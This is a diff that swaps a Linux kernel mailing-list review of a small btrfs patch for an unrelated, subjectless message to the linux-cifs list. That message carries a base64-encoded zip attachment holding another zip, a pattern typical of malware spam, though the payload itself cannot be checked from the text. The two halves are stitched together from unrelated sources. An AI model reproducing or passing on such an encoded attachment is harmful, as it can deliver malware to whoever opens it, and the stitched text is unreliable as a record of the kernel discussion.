@@ -1,90 +1,66 @@
-From: Liu Bo <bo.li.liu@oracle.com>
-Subject: Re: [PATCH v4 05/27] btrfs:
- btrfs_wait_tree_block_writeback can be void return
-Date: Thu, 18 May 2017 21:07:31 -0700
-Message-ID: <20170519040731.GA30704@lim.localdomain>
-References: <20170509154930.29524-1-jlayton@redhat.com>
-	<20170509154930.29524-6-jlayton@redhat.com>
-Reply-To: bo.li.liu@oracle.com
+From: <counselling-30L6jp03H7UtpYsHHOQ6Llpr/1R2p/CL@public.gmane.org>
+Subject: (unknown)
+Date: Fri, 19 May 2017 11:45:09 -0000
+Message-ID: <149519430975.27287.2354409186493730725@vsnl.net.in>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
-Cc: jfs-discussion@lists.sourceforge.net, hch@infradead.org,
-	dhowells@redhat.com, linux-mm@kvack.org, hubcap@omnibond.com,
-	linux-cifs@vger.kernel.org, linux-nilfs@vger.kernel.org,
-	corbet@lwn.net, cluster-devel@redhat.com,
-	v9fs-developer@lists.sourceforge.net,
-	ross.zwisler@linux.intel.com, linux-ext4@vger.kernel.org,
-	josef@toxicpanda.com, linux-block@vger.kernel.org,
-	rpeterso@redhat.com, viro@zeniv.linux.org.uk, axboe@kernel.dk,
-	linux-nfs@vger.kernel.org, tytso@mit.edu, clm@fb.com,
-	mawilcox@microsoft.com, linux-kernel@vger.kernel.org,
-	linux-f2fs-devel@lists.sourceforge.net,
-	linux-xfs@vger.kernel.org, jack@suse.com,
-	linux-fsdevel@vger.kernel.org, akpm@linux-foundation.org,
-	linux-btrfs@vger.kernel.org
-To: Jeff Layton <jlayton@redhat.com>
-Return-path: <linux-f2fs-devel-bounces@lists.sourceforge.net>
-Content-Disposition: inline
-In-Reply-To: <20170509154930.29524-6-jlayton@redhat.com>
-List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/linux-f2fs-devel>,
-	<mailto:linux-f2fs-devel-request@lists.sourceforge.net?subject=unsubscribe>
-List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=linux-f2fs-devel>
-List-Post: <mailto:linux-f2fs-devel@lists.sourceforge.net>
-List-Help: <mailto:linux-f2fs-devel-request@lists.sourceforge.net?subject=help>
-List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/linux-f2fs-devel>,
-	<mailto:linux-f2fs-devel-request@lists.sourceforge.net?subject=subscribe>
-Errors-To: linux-f2fs-devel-bounces@lists.sourceforge.net
-List-Id: linux-cifs.vger.kernel.org
+Content-Type: application/zip; name="8991909.zip"
+Content-Transfer-Encoding: base64
+To: <linux-cifs-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
+Return-path: <linux-cifs-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
+Content-Disposition: attachment
+Subject: 
+Sender: linux-cifs-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
+List-ID: <linux-cifs.vger.kernel.org>
 
-On Tue, May 09, 2017 at 11:49:08AM -0400, Jeff Layton wrote:
-> Nothing checks its return value.
-
-Reviewed-by: Liu Bo <bo.li.liu@oracle.com>
-
--liubo
-> 
-> Signed-off-by: Jeff Layton <jlayton@redhat.com>
-> ---
->  fs/btrfs/disk-io.c | 6 +++---
->  fs/btrfs/disk-io.h | 2 +-
->  2 files changed, 4 insertions(+), 4 deletions(-)
-> 
-> diff --git a/fs/btrfs/disk-io.c b/fs/btrfs/disk-io.c
-> index eb1ee7b6f532..8c479bd5534a 100644
-> --- a/fs/btrfs/disk-io.c
-> +++ b/fs/btrfs/disk-io.c
-> @@ -1222,10 +1222,10 @@ int btrfs_write_tree_block(struct extent_buffer *buf)
->  					buf->start + buf->len - 1);
->  }
->  
-> -int btrfs_wait_tree_block_writeback(struct extent_buffer *buf)
-> +void btrfs_wait_tree_block_writeback(struct extent_buffer *buf)
->  {
-> -	return filemap_fdatawait_range(buf->pages[0]->mapping,
-> -				       buf->start, buf->start + buf->len - 1);
-> +	filemap_fdatawait_range(buf->pages[0]->mapping,
-> +			        buf->start, buf->start + buf->len - 1);
->  }
->  
->  struct extent_buffer *read_tree_block(struct btrfs_fs_info *fs_info, u64 bytenr,
-> diff --git a/fs/btrfs/disk-io.h b/fs/btrfs/disk-io.h
-> index 2e0ec29bfd69..9cc87835abb5 100644
-> --- a/fs/btrfs/disk-io.h
-> +++ b/fs/btrfs/disk-io.h
-> @@ -127,7 +127,7 @@ int btrfs_wq_submit_bio(struct btrfs_fs_info *fs_info, struct inode *inode,
->  			extent_submit_bio_hook_t *submit_bio_done);
->  unsigned long btrfs_async_submit_limit(struct btrfs_fs_info *info);
->  int btrfs_write_tree_block(struct extent_buffer *buf);
-> -int btrfs_wait_tree_block_writeback(struct extent_buffer *buf);
-> +void btrfs_wait_tree_block_writeback(struct extent_buffer *buf);
->  int btrfs_init_log_root_tree(struct btrfs_trans_handle *trans,
->  			     struct btrfs_fs_info *fs_info);
->  int btrfs_add_log_tree(struct btrfs_trans_handle *trans,
-> -- 
-> 2.9.3
-> 
-
-------------------------------------------------------------------------------
-Check out the vibrant tech community on one of the world's most
-engaging tech sites, Slashdot.org! http://sdm.link/slashdot
+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
+AAAA8woAAAAA
